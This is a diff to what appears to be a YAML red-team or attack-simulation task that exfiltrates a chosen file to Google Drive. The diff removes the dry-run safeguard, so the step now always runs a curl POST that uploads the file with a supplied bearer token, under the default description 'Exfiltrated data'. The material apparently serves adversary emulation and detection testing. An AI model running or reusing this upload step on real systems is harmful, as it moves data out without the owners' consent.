@@ -33,10 +33,6 @@ args:
   description: File description in Drive
   type: string
   default: Exfiltrated data
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.file_path }}' || (echo 'File not found'; exit 1)
@@ -59,19 +55,11 @@ steps:
     echo "Upload metadata prepared"
 - name: Execute Google Drive upload
   inline: |
-    if [ '{{ .Args.dry_run }}' = 'true' ]; then
-      echo "DRY RUN: Google Drive Upload"
-      echo "Endpoint: https://www.googleapis.com/upload/drive/v3/files"
-      echo "Method: POST (multipart/related)"
-      echo "File: $(basename '{{ .Args.file_path }}')"
-      echo "Folder ID: {{ .Args.drive_folder_id }}"
-    else
-      curl -X POST \
-        -H 'Authorization: Bearer TOKEN' \
-        -F 'metadata=@/tmp/drive_metadata.json;type=application/json' \
-        -F "file=@'{{ .Args.file_path }}'" \
-        'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart'
-    fi
+    curl -X POST \
+      -H 'Authorization: Bearer {{ .Args.drive_api_key }}' \
+      -F 'metadata=@/tmp/drive_metadata.json;type=application/json' \
+      -F "file=@'{{ .Args.file_path }}'" \
+      'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart'
   cleanup:
     inline: rm -f /tmp/test_drive.dat /tmp/drive_meta.json /tmp/drive_metadata.json
 tests:
